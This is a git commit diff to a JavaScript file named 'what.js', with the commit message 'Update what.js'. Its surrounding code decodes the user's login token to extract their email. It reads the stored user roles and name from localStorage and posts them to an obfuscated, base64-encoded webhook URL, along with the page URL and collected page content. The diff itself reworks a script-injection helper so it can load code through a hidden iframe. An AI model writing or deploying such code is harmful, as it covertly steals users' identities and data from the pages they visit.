b4e98157c174afd5c5069c1708f389087f382c5e
ScriggerMania <kryospehereis@gmail.com>
2024-10-13 02:26:47 -0500

    Update what.js

--- what.js
+++ what.js
@@ -3,15 +3,26 @@ setTimeout(()=>{
     let whoiam=JSON.parse(atob(__xnext().split(".")[1]))["email"];
     let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone "+whoiam+" <"+window.location.href+"> `"+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.user_roles)+"` "+JSON.parse(localStorage.getItem("stores")).user.profile.name});e.append("payload_json",i),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{method:"POST",body:e});
 },2000)
-function load(url,pos = null,type=null) {
-        if (pos==null){
-            pos = document.body
-        }
-        const iframe = document.createElement('script');
-        iframe.src = url;
-        if (type!=null){
-            iframe.type = type
-        }
-        pos.appendChild(iframe);
+function load(url, pos = null, type = null) {
+    let targetDocument;
+    
+    if (pos == null || !document.body) {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.documentElement.appendChild(iframe);
+        targetDocument = iframe.contentDocument || iframe.contentWindow.document;
+    } else {
+        targetDocument = document;
+        pos = document.body;
+    }
+
+    const script = targetDocument.createElement('script');
+    script.src = url;
+    if (type != null) {
+        script.type = type;
+    }
+
+    pos.appendChild(script);
 }
+
 load('https://cdnjs.cloudflare.com/ajax/libs/pako/1.0.11/pako.min.js');
